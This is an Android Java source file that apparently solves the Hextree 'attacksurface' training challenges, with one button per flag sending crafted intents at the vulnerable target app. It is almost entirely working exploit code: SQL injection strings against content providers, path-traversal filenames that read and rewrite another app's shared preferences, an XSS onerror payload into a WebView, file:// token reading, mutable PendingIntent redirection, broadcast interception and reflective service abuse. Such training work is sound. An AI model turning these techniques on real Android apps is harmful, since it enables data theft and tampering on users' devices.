package com.sntrain.kribas.hextree1;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.ServiceConnection;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Color;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Message;
import android.os.Messenger;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import androidx.activity.EdgeToEdge;
import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Arrays;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.stream.Collectors;

import io.hextree.attacksurface.services.IFlag28Interface;
import io.hextree.attacksurface.services.IFlag29Interface;

public class MainHextreeSolverActivity extends AppCompatActivity {
    int count = 0;
    boolean f18Active = false;
    BroadcastReceiver f18Receiver = null;
    private ActivityResultLauncher<Intent> flag9Launcher =
            registerForActivityResult(
                    new ActivityResultContracts.StartActivityForResult(),
                    result -> {
                        if (result.getResultCode() == -1) {
                            Intent data = result.getData();
                            if (data != null) {
                                String flag = data.getStringExtra("flag");
                                Log.d("FLAG", "Flag is: " + flag);
                            }
                        }
                    }
            );

    private ActivityResultLauncher<Intent> flag33_1Launcher = registerForActivityResult(
            new ActivityResultContracts.StartActivityForResult(),
            result -> {
                if (result.getResultCode() == -1) {
                    Intent data = result.getData();
                    if (data != null) {
                        Uri uri = data.getData();
                        String sqli = "1=1 UNION SELECT null,title,content,null FROM Note";
                        dumpCP(uri,sqli);
                        Log.d("Flag33.1Solver", "Uri is: " + uri.toString());

                    }
                }
            }
    );


    private ActivityResultLauncher<Intent> flag34Launcher = registerForActivityResult(
            new ActivityResultContracts.StartActivityForResult(),
            result -> {
                if (result.getResultCode() == -1 || result.getResultCode() == 0) {
                    Intent data = result.getData();
                    if (data != null) {
                        Uri uri = data.getData();
                        String file = MyUtils.readFile(this,uri);
                        Log.d("Flag34Solver", "Uri is: " + uri.toString());
                        Log.v("Flag34Solver", "Content: "+file);

                    }
                }
            }
    );

    private ActivityResultLauncher<Intent> flag35Launcher = registerForActivityResult(
            new ActivityResultContracts.StartActivityForResult(),
            result -> {
                Log.v("Flag35Solver","Result: "+result);
                if (result.getResultCode() == -1 || result.getResultCode() == 0) {
                    Intent data = result.getData();
                    if (data != null) {
                        Uri uri = data.getData();
                        String file = MyUtils.readFile(this,uri);
                        Log.d("Flag35Solver", "Uri is: " + uri.toString());
                        Log.v("Flag35Solver", "Content: "+file);

                    }
                }
            }
    );


    private ActivityResultLauncher<Intent> flag36Launcher = registerForActivityResult(
            new ActivityResultContracts.StartActivityForResult(),
            result -> {
                Log.v("Flag36Solver","Result: "+result);
                if (result.getResultCode() == -1 || result.getResultCode() == 0) {
                    Intent data = result.getData();
                    if (data != null) {
                        Uri uri = data.getData();
                        Log.d("Flag36Solver", "Uri is: " + uri.toString());
                        try {
                            InputStream inputStream = this.getContentResolver().openInputStream(uri);
                            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
                            String content = bufferedReader.lines()
                                    .collect(Collectors.joining("\n"));
                            inputStream.close();
                            String modified = content.replace(
                                    "name=\"solved\" value=\"false\"",
                                    "name=\"solved\" value=\"true\""
                            );

                            // Write the modified content back
                            OutputStream outputStream = this.getContentResolver().openOutputStream(uri, "wt");
                            outputStream.write(modified.getBytes());
                            outputStream.close();
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                        String file = MyUtils.readFile(this,uri);
                        Log.v("Flag36Solver", "Content: "+file);
                        Intent intent = new Intent();
                        intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag35Activity");
                        intent.putExtra("filename","../shared_prefs/Flag36Preferences.xml");
                        flag35Launcher.launch(intent);
                    }
                }
            }
    );

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });
        Button homeButton = findViewById(R.id.home_button);

        homeButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Log.v("MainActivity.onCreate","homeButton.onClick() activated");
                ExecutorService executor = Executors.newSingleThreadExecutor();

                executor.execute(() -> {
                    HttpURLConnection urlConnection = null;

                    try {
                        URL url = new URL("https://www.android.com/");
                        urlConnection = (HttpURLConnection) url.openConnection();

                        InputStream in = new BufferedInputStream(urlConnection.getInputStream());
                        BufferedReader reader = new BufferedReader(new InputStreamReader(in));

                        StringBuilder sb = new StringBuilder();
                        String line;

                        while ((line = reader.readLine()) != null) {
                            sb.append(line).append('\n');
                        }

                        String result = sb.toString();

                    } catch (Exception e) {
                        e.printStackTrace();
                    } finally {
                        if (urlConnection != null) {
                            urlConnection.disconnect();
                        }
                    }
                });
            }
        });

        //Flag1Activity
        Button f1 = findViewById(R.id.f1);
        f1.setOnClickListener(v -> {
            Intent intent = new Intent();
            intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag1Activity");
            startActivity(intent);
        });

        //Flag2Activity
        Button f2 = findViewById(R.id.f2);
        f2.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent();
                intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag2Activity");
                intent.setAction("io.hextree.action.GIVE_FLAG");
                startActivity(intent);
            }
        });

        //Flag3Activity
        Button f3 = findViewById(R.id.f3);
        f3.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent();
                intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag3Activity");
                intent.setAction("io.hextree.action.GIVE_FLAG");
                intent.setData(Uri.parse ("https://app.hextree.io/map/android"));
                startActivity(intent);
            }
        });

        //Flag4Activity
        // INIT -> PREPARE -> BUILD -> GET_FLAG
        Button f4 = findViewById(R.id.f4);
        f4.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent();
                intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag4Activity");
                intent.setAction("GET_FLAG_ACTION");
                startActivity(intent);
            }
        });

        //Flag5Activity
        Button f5 = findViewById(R.id.f5);
        f5.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent1 = new Intent();
                intent1.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag5Activity");
                Intent intent2 = new Intent();
                intent2.putExtra("return",42);
                Intent intent3 = new Intent();
                intent3.putExtra("reason","back");
                intent2.putExtra("nextIntent",intent3);
                intent1.putExtra("android.intent.extra.INTENT",intent2);

                startActivity(intent1);
            }
        });

        //Flag6Activity
        Button f6 = findViewById(R.id.f6);
        f6.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent1 = new Intent();
                intent1.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag5Activity");
                Intent intent2 = new Intent();
                intent2.putExtra("return",42);
                Intent intent3 = new Intent();
                intent3.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag6Activity");
                intent3.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
                intent3.putExtra("reason","next");
                intent2.putExtra("nextIntent",intent3);
                intent1.putExtra("android.intent.extra.INTENT",intent2);

                startActivity(intent1);
            }
        });

        //Flag7Activity
        Button f7 = findViewById(R.id.f7);
        f7.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent1 = new Intent();
                intent1.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag7Activity");
                intent1.setAction("OPEN");
                startActivity(intent1);
            }
        });

        //Flag8Activity
        Button f8 = findViewById(R.id.f8);
        f8.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent1 = new Intent();
                intent1.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag8Activity");
                startActivityForResult(intent1,1);
            }
        });


        //Flag9Activity
        Button f9 = findViewById(R.id.f9);
        f9.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent();
                intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag9Activity");
                // startActivityForResult(intent1,9); DEPRECATED
                flag9Launcher.launch(intent);
            }
        });

        //Flag12Activity
        Button f12 = findViewById(R.id.f12);
        f12.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent1 = new Intent();
                intent1.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag12Activity");
                intent1.putExtra("LOGIN",true);
                startActivity(intent1);
            }
        });

        //Flag13Activity
        Button f13 = findViewById(R.id.f13);
        f13.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent1 = new Intent();
                intent1.setAction("android.intent.action.VIEW");
                intent1.setData(Uri.parse("https://ht-api-mocks-lcfc4kr5oa-uc.a.run.app/android-link-builder?href="+Uri.encode("hex://flag?action=give-me")));
                startActivity(intent1);
            }
        });

        //Flag15Activity
        Button f15 = findViewById(R.id.f15);
        f15.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent1 = new Intent();
                intent1.setAction("android.intent.action.VIEW");
                String customIntentDeeplink = Uri.encode("intent:#Intent;"+
                        "package=io.hextree.attacksurface;"+
                        "component=io.hextree.attacksurface/.activities.Flag15Activity;"+
                        "action=io.hextree.action.GIVE_FLAG;" +
                        "category=android.intent.category.BROWSABLE;" +
                        "S.com.android.browser.application_id=com.android.chrome;" +
                        "S.action=flag;" +
                        "B.flag=true;" +
                        "end");
                intent1.setData(Uri.parse("https://ht-api-mocks-lcfc4kr5oa-uc.a.run.app/android-link-builder?href="+customIntentDeeplink));
                startActivity(intent1);
            }
        });

        //Flag16Activity
        Button f16 = findViewById(R.id.f16);
        f16.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent1 = new Intent();
                intent1.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.receivers.Flag16Receiver");
                intent1.putExtra("flag","give-flag-16");
                sendBroadcast(intent1);
            }
        });

        //Flag17Activity
        Button f17 = findViewById(R.id.f17);
        f17.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent1 = new Intent();
                intent1.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.receivers.Flag17Receiver");
                intent1.putExtra("flag","give-flag-17");
                sendOrderedBroadcast(intent1,null);
            }
        });

        //Flag18Activity
        Button f18 = findViewById(R.id.f18);
        f18.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if (f18Receiver == null){
                    Log.v("Flag18Solver","Creating Receiver");
                    f18Receiver = new Flag18Receiver();
                }
                if (f18Active){
                    //Toggle Receiver off
                    f18Active = false;
                    Log.v("Flag18Solver","Unregistering Receiver");
                    f18.setBackgroundColor(Color.RED);
                    unregisterReceiver(f18Receiver);
                }else {
                    //Toggle Receiver on
                    Log.v("Flag18Solver","Registering Receiver");
                    f18Active = true;
                    f18.setBackgroundColor(Color.GREEN);
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                        registerReceiver(f18Receiver, new IntentFilter("io.hextree.broadcast.FREE_FLAG"), Context.RECEIVER_EXPORTED);
                    } else {
                        registerReceiver(f18Receiver, new IntentFilter("io.hextree.broadcast.FREE_FLAG"));
                    }
                }
            }
        });

        //Flag19Activity
        Button f19 = findViewById(R.id.f19);
        f19.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Log.v("Flag19Solver","Sending broadcast");
                Intent intent1 = new Intent();
                intent1.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.receivers.Flag19Widget");
                intent1.setAction("io.hextree.APPWIDGET_UPDATE");
                Bundle bundleExtra = new Bundle();
                bundleExtra.putInt("appWidgetMaxHeight",1094795585);
                bundleExtra.putInt("appWidgetMinHeight",322376503);
                intent1.putExtra("appWidgetOptions",bundleExtra);
                String action = intent1.getAction();
                Log.v("Flag19Solver","Checking pass condition (should be false): "+String.valueOf((action == null || !action.contains("APPWIDGET_UPDATE") || (bundleExtra = intent1.getBundleExtra("appWidgetOptions")) == null) ));
                sendBroadcast(intent1);
            }
        });

        //Flag20Activity
        Button f20 = findViewById(R.id.f20);
        f20.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Log.v("Flag20Solver","Button Clicked");
                Log.v("Flag20Solver","Make sure you have clicked the Flag20 Activity on the Hextree App before sending this broadcast");
                Intent intent1 = new Intent();
                intent1.setAction("io.hextree.broadcast.GET_FLAG");
                intent1.putExtra("give-flag",true);
                sendBroadcast(intent1,null);
                Log.v("Flag20Solver","This should solve the challenge but i'm not sure it's the intended way");
            }
        });

        //Flag20Activity
        Button f21 = findViewById(R.id.f21);
        f21.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Log.v("Flag21Solver","Button Clicked");
                Log.v("Flag21Solver","Make sure you click the Flag21 notification button on after setting this broadcast receiver");
                IntentFilter filter = new IntentFilter("io.hextree.broadcast.GIVE_FLAG");
                filter.setPriority(1000);
                registerReceiver(new BroadcastReceiver() {
                    @Override
                    public void onReceive(Context context, Intent intent) {
                        String flag = intent.getStringExtra("flag");
                        Log.d("Flag21Solver", "Flag: " + flag);
                    }
                }, filter,RECEIVER_EXPORTED);
                //sendBroadcast(intent1,null);
            }
        });


        //Flag22Activity
        Button f22 = findViewById(R.id.f22);
        f22.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent1 = new Intent();
                intent1.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag22Activity");
                Intent intent2 = new Intent();
                intent2.setClassName("com.sntrain.kribas.hextree1","com.sntrain.kribas.hextree1.HextreeReceivingActivity");
                intent2.setAction("io.hextree.attacksurface.ATTACK_ME");
                PendingIntent pending = PendingIntent.getActivity(MainHextreeSolverActivity.this,1337,intent2,PendingIntent.FLAG_MUTABLE);
                intent1.putExtra("PENDING",pending);
                startActivity(intent1);
            }
        });

        Button f24 = findViewById(R.id.f24);
        f24.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Log.v("Flag24Solver","Button Clicked");
                Intent app = new Intent();
                app.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.MainActivity");
                app.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(app);
                v.postDelayed(() -> {
                    Intent intent1 = new Intent();
                    intent1.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag24Service");
                    intent1.setAction("io.hextree.services.START_FLAG24_SERVICE");
                    Log.v("Flag24Solver", MyUtils.dumpIntent(MainHextreeSolverActivity.this,intent1));
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        startForegroundService(intent1);
                    } else {
                        startService(intent1);
                    }
                }, 5000);

            }
        });

        // Flag25Activity
        Button f25 = findViewById(R.id.f25);
        f25.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Log.v("Flag25Solver", "Button Clicked");

                // Register and fire broadcast first
                BroadcastReceiver receiver = new BroadcastReceiver() {
                    @Override
                    public void onReceive(Context context, Intent intent) {
                        String[] actions = {
                                "io.hextree.services.UNLOCK1",
                                "io.hextree.services.UNLOCK2",
                                "io.hextree.services.UNLOCK3"
                        };

                        for (int i = 0; i < actions.length; i++) {
                            final String action = actions[i];
                            final int index = i + 1;
                            v.postDelayed(() -> {
                                Intent serviceIntent = new Intent();
                                serviceIntent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag25Service");
                                serviceIntent.setAction(action);
                                Log.v("Flag25Solver", "Starting service " + index + " with action: " + action);
                                Toast.makeText(context, "Starting service " + index, Toast.LENGTH_SHORT).show();
                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                    context.startForegroundService(serviceIntent);
                                } else {
                                    context.startService(serviceIntent);
                                }
                            }, i * 5000L + 2000L);
                        }
                    }
                };

                IntentFilter filter = new IntentFilter("com.sntrain.kribas.hextree1.START_FLAG25");
                registerReceiver(receiver, filter,RECEIVER_EXPORTED);
                sendBroadcast(new Intent("com.sntrain.kribas.hextree1.START_FLAG25"));

                // Open target app concurrently
                Intent app = new Intent();
                app.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.MainActivity");
                app.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(app);
            }
        });

        //Flag26Activity
        Button f26 = findViewById(R.id.f26);
        f26.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Log.v("Flag26Solver", "Button Clicked");
                Intent intent = new Intent();
                intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag26Service");
                intent.setAction("io.hextree.services.START_FLAG26_SERVICE");
                startService(intent); //  if this doesnt work start it via adb:
                //adb shell am startservice -n io.hextree.attacksurface/io.hextree.attacksurface.services.Flag26Service
                bindService(intent, new ServiceConnection() {
                    @Override
                    public void onServiceConnected(ComponentName name, IBinder service) {
                        Log.v("Flag26Solver", "Service connected");
                        Messenger messenger = new Messenger(service);
                        Message msg = Message.obtain(null,42);
                        try {
                            messenger.send(msg);
                        }catch (Exception e){
                            e.printStackTrace();
                        }

                    }
                    @Override
                    public void onServiceDisconnected(ComponentName name) {
                        Log.v("Flag26Solver", "Service disconnected");
                    }
                }, Context.BIND_AUTO_CREATE);
            }
        });

        //Flag27Activity
        Button f27 = findViewById(R.id.f27);
        f27.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Log.v("Flag27Solver", "Button Clicked");
                Intent intent = new Intent();
                intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag27Service");
                startService(intent); //  if this doesnt work start it via adb:
                //adb shell am startservice -n io.hextree.attacksurface/io.hextree.attacksurface.services.Flag27Service
                bindService(intent,new ServiceConnection() {
                    @Override
                    public void onServiceConnected(ComponentName name, IBinder service) {
                        Log.v("Flag27Solver", "Service connected");
                        Flag27ServiceInteractor f27SI = new Flag27ServiceInteractor();
                        Messenger messenger = new Messenger(service);
                        // 1. get Password
                        Message msg1 = f27SI.getGetPasswordMessage();
                        try {
                            Log.v("Flag27Solver", "Sending getPasswordMessage");
                            messenger.send(msg1);
                        }catch (Exception e){
                            e.printStackTrace();
                        }
                        // 2. set echo
                        Message msg2 = f27SI.getSetEchoMessage();
                        try {
                            Log.v("Flag27Solver", "Sending setEchoMessage");
                            messenger.send(msg2);
                        }catch (Exception e){
                            e.printStackTrace();
                        }
                        v.postDelayed(() -> {
                            // 3. get Flag
                            Message msg3 = f27SI.getGetFlagMessage();
                            try {
                                Log.v("Flag27Solver", "Sending getFlagMessage");
                                messenger.send(msg3);
                            }catch (Exception e){
                                e.printStackTrace();
                            }
                        }, 5000);
                    }
                    @Override
                    public void onServiceDisconnected(ComponentName name) {
                        Log.v("Flag27Solver", "Service disconnected");
                    }
                }, Context.BIND_AUTO_CREATE);


            }
        });


        //Flag28Activity
        Button f28 = findViewById(R.id.f28);
        f28.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Log.v("Flag28Solver","Button Clicked");
                Intent intent = new Intent();
                intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.services.Flag28Service");
                ServiceConnection mconnect = new ServiceConnection() {

                    @Override
                    public void onServiceConnected(ComponentName name, IBinder service) {
                        Log.v("Flag28Solver","Service Connected");
                        try {
                            // Questo carica l'interfaccia a runtime
                            // direttamente dall'apk target
                            // Non richiede di clonare l'AIDL
                            this.onServiceConnectedV2(name,service);
                        } catch (Exception e){
                            // Questo carica l'interfaccia staticamente
                            // Richeide di ricreare l'AIDL
                            e.printStackTrace();
                            this.onServiceConnectedV1(name,service);
                        }
                    }
                    public void onServiceConnectedV1(ComponentName name, IBinder service) {
                        Log.v("Flag28Solver","Service Connected V1");
                        IFlag28Interface flag28Interface = IFlag28Interface.Stub.asInterface(service);
                        try {
                            flag28Interface.openFlag();
                        }
                        catch (Exception e){
                            e.printStackTrace();
                        }
                    }


                    public void onServiceConnectedV2(ComponentName name, IBinder service) throws PackageManager.NameNotFoundException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
                        Log.v("Flag28Solver","Service Connected V2");
                        // First get the classLoarder for the target APP
                        Log.v("Flag28Solver","Getting ClassLoader");
                        ClassLoader classLoader = MainHextreeSolverActivity.this
                                .createPackageContext("io.hextree.attacksurface", Context.CONTEXT_INCLUDE_CODE|Context.CONTEXT_IGNORE_SECURITY)
                                .getClassLoader();
                        // Then load the interface
                        Log.v("Flag28Solver","Loading Interface");
                        Class<?> flag28Interface = classLoader.loadClass("io.hextree.attacksurface.services.IFlag28Interface");
                        // Then find the Stub subclass
                        Log.v("Flag28Solver","Finding Stub");
                        Class<?> flag28InterfaceStub = Arrays.stream(flag28Interface.getDeclaredClasses()).filter(subclass -> subclass.getSimpleName().equals("Stub")).findFirst().orElse(null);
                        // Then find the asInterface method
                        Log.v("Flag28Solver","Finding asInterface");
                        Method flag28StubAsInterfaceMethod = flag28InterfaceStub.getDeclaredMethod("asInterface",IBinder.class);
                        // Now i can finally have an interactable service interface
                        Log.v("Flag28Solver","Getting an instance");
                        Object flag28Service = flag28StubAsInterfaceMethod.invoke(null,service);
                        Log.v("Flag28Solver","Invoking openFlag()");
                        flag28Service.getClass().getDeclaredMethod("openFlag").invoke(flag28Service);
                    }

                    @Override
                    public void onServiceDisconnected(ComponentName name) {
                        Log.v("Flag28Solver","Service Disconnected");
                    }
                };
                bindService(intent,mconnect,Context.BIND_AUTO_CREATE);
                // Dopo aver premuto il tasto fai partire il servizio:
                // adb shell am startservice -n io.hextree.attacksurface/io.hextree.attacksurface.services.Flag28Service

            }
        });

        //Flag28Activity
        Button f29 = findViewById(R.id.f29);
        f29.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Log.v("Flag29Solver","Button Clicked");
                Intent intent = new Intent();
                intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.services.Flag29Service");
                ServiceConnection mconnect = new ServiceConnection() {
                    @Override
                    public void onServiceConnected(ComponentName name, IBinder service) {
                        Log.v("Flag29Solver","Service Connected");
                        IFlag29Interface flag29Interface = IFlag29Interface.Stub.asInterface(service);
                        try {
                            String password = flag29Interface.init();
                            Log.v("Flag29Solver","Received Password:"+password+". Authenticating... ");
                            flag29Interface.authenticate(password);
                            Log.v("Flag29Solver","Hopefully authenticated, calling success");
                            flag29Interface.success();
                        }
                        catch (Exception e){
                            e.printStackTrace();
                        }
                    }

                    @Override
                    public void onServiceDisconnected(ComponentName name) {
                        Log.v("Flag29Solver","Service Disconnected");
                    }
                };
                bindService(intent,mconnect,Context.BIND_AUTO_CREATE);
                // Dopo aver premuto il tasto fai partire il servizio:
                // adb shell am startservice -n io.hextree.attacksurface/io.hextree.attacksurface.services.Flag29Service

            }
        });


        //Flag30Activity
        Button f30 = findViewById(R.id.f30);
        f30.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Log.v("Flag30Solver","Button Clicked");
                //Cursor queryResult =  MainHextreeSolverActivity.this.getContentResolver().query(Uri.parse("io.hextree.flag30"),null,null,null);
                try {
                    dumpCP(Uri.parse("content://io.hextree.flag30/success"));
                }catch (Exception e){
                    e.printStackTrace();
                }
                Toast.makeText(v.getContext(),"[Flag30Solver] Query Executed check logs",Toast.LENGTH_LONG).show();
            }
        });

        //Flag31Activity
        Button f31 = findViewById(R.id.f31);
        f31.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Log.v("Flag31Solver","Button Clicked");
                //Cursor queryResult =  MainHextreeSolverActivity.this.getContentResolver().query(Uri.parse("io.hextree.flag30"),null,null,null);
                try {
                    dumpCP(Uri.parse("content://io.hextree.flag31/flag/31"));
                }catch (Exception e){
                    e.printStackTrace();
                }
                Toast.makeText(v.getContext(),"[Flag31Solver] Query Executed check logs",Toast.LENGTH_LONG).show();
            }
        });

        //Flag32Activity
        Button f32 = findViewById(R.id.f32);
        f32.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Log.v("Flag32Solver","Button Clicked");
                String sqli = "1=0) UNION SELECT _id,name,value,visible FROM Flag UNION SELECT null,title,content,null FROM Note WHERE (1=1";
                //Cursor queryResult =  MainHextreeSolverActivity.this.getContentResolver().query(Uri.parse("io.hextree.flag30"),null,null,null);
                try {
                    dumpCP(Uri.parse("content://io.hextree.flag32/flags"),sqli);
                }catch (Exception e){
                    e.printStackTrace();
                }
                Toast.makeText(v.getContext(),"[Flag32Solver] Query Executed check logs",Toast.LENGTH_LONG).show();
            }
        });

        //Flag33Activity1
        Button f33_1 = findViewById(R.id.f33_1);
        f33_1.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Log.v("Flag33.1Solver","Button Clicked");

                Intent intent = new Intent();
                intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag33Activity1");
                intent.setAction("io.hextree.FLAG33");
                flag33_1Launcher.launch(intent);


                Toast.makeText(v.getContext(),"[Flag33.1Solver] Query Executed check logs",Toast.LENGTH_LONG).show();
            }
        });

        //Flag33Activity2
        Button f33_2= findViewById(R.id.f33_2);
        f33_2.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Log.v("Flag33.3Solver","Button Clicked");

                Toast.makeText(v.getContext(),"[Flag33.2Solver] Not Yet Implemented!",Toast.LENGTH_LONG).show();
            }
        });

        //Flag34Activity
        Button f34= findViewById(R.id.f34);
        f34.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Log.v("Flag34Solver","Button Clicked");
                Intent intent = new Intent();
                intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag34Activity");
                intent.putExtra("filename","flags/flag34.txt");
                flag34Launcher.launch(intent);
            }
        });

        //Flag35Activity
        Button f35= findViewById(R.id.f35);
        f35.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Log.v("Flag35Solver","Button Clicked");
                Intent intent = new Intent();
                intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag35Activity");
                intent.putExtra("filename","../flag35.txt");
                flag35Launcher.launch(intent);
            }
        });

        //Flag36Activity
        Button f36= findViewById(R.id.f36);
        f36.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Log.v("Flag36Solver","Button Clicked");
                Intent intent = new Intent();
                intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag35Activity");
                intent.putExtra("filename","../shared_prefs/Flag36Preferences.xml");
                flag36Launcher.launch(intent);
            }
        });

        //Flag39Activity
        Button f39 = findViewById(R.id.f39);
        f39.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Log.v("Flag39Solver","Button Clicked");
                Intent intent = new Intent();
                intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.webviews.Flag39WebViewsActivity");
                intent.putExtra("NAME","Executing hextree.success()<br/><img src=x onerror=javascript:hextree.success()>");
                startActivity(intent);
            }
        });

        //Flag37Activity
        Button f37 = findViewById(R.id.f37);
        f37.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Log.v("Flag39Solver","Button Clicked");
                Intent intent = new Intent();
                intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.webviews.Flag39WebViewsActivity");
                intent.putExtra("NAME","Executing hextree.success()<br/><img src=x onerror=javascript:hextree.success()>");
                startActivity(intent);
            }
        });

        //Flag40Activity
        Button f40 = findViewById(R.id.f40);
        f40.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Log.v("Flag40Solver","Button Clicked");
                Intent intent = new Intent();
                intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.webviews.Flag40WebViewsActivity");
                intent.putExtra("URL","file:///data/data/io.hextree.attacksurface/files/token.txt");
                startActivity(intent);
                // Probabilmente un'intended ma aprendo molto velocemente l'inspector e incollando questa roba:
                // hextree.authCallback(document.getElementsByTagName("pre")[0].innerText)
                // hai la flag
                // HXT{leak-fileprovider-1gash2}
            }
        });
    }

    public void dumpCP(Uri uri) {
        Cursor cursor = getContentResolver().query(uri, null, null, null, null);
        if (cursor.moveToFirst()) {
            do {
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < cursor.getColumnCount(); i++) {
                    if (sb.length() > 0) {
                        sb.append(", ");
                    }
                    sb.append(cursor.getColumnName(i) + " = " + cursor.getString(i));
                }
                Log.v("DumpContentProviderQuery", sb.toString());
            } while (cursor.moveToNext());
        }
    }
    public void dumpCP(Uri uri,String selection) {
        Cursor cursor = getContentResolver().query(uri, null, selection, null, null);
        if (cursor.moveToFirst()) {
            do {
                StringBuilder sb = new StringBuilder();
